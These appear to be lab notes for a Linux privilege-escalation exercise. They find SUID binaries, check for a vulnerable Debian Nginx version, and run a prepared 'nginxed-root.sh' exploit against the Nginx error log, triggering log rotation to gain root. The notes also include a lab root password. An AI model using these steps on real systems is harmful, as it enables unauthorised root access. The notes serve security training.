
## Detection

**Linux VM**

1. Check the installed Nginx version:
   ```bash
   dpkg -l | grep nginx
   ```

![[Pasted image 20240917201946.png]]
2. Note if the version is below `1.6.2-5+deb8u3`.

```
find / -perm -u=s -type f 2>/dev/null

```

searches for files with the SUID (Set User ID) bit set. Here's a breakdown:

- `find /`: Starts searching from the root directory (`/`) and goes through all directories.
- `-perm -u=s`: Finds files that have the SUID permission set. This means the file can execute with the privileges of the file's owner, not the user running it.
- `-type f`: Limits the search to regular files (ignores directories or special files).
- `2>/dev/null`: Redirects error messages (like "Permission denied") to `/dev/null`, which discards them, so they don't clutter the output.



3. find the binary that will help us - /bin/sudo
![[Pasted image 20240917202315.png]]

## Exploitation

**Linux VM – Terminal 1**
  
1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: **su root**

2. The root password is **password123**

3. Once escalated to root, in command prompt type: **su -l www-data**
1. Simulate the user as `www-data`:
   ```bash
   su -l www-data
   ```
2. Run the Nginx exploit:
  ```bash
 /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
   ```

![[Pasted image 20240917203622.png]]
![[Pasted image 20240917203633.png]]

**Linux VM – Terminal 2**

1. Speed up the process by rotating logs:
   ```bash
   su root
   invoke-rc.d nginx rotate >/dev/null 2>&1
   ```

**Linux VM – Terminal 1**

1. From the output, notice that the exploit continued its execution.
2. Check your user ID:
   ```bash
   id
   ```
